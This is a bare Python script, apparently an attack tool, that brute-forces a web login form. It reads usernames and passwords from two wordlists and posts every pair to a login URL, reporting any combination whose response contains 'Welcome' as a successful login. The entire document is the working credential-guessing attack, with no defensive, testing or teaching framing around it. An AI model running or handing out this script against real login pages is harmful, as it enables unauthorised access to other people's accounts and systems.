import requests

url = 'http://example.com/login'
username_list = 'usernames.txt'
password_list = 'passwords.txt'

with open(username_list, 'r') as user_file:
    usernames = [line.strip() for line in user_file.readlines()]

with open(password_list, 'r') as pass_file:
    passwords = [line.strip() for line in pass_file.readlines()]

for username in usernames:
    for password in passwords:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if 'Welcome' in response.text:
            print(f'[+] Login successful: {username}:{password}')
            break
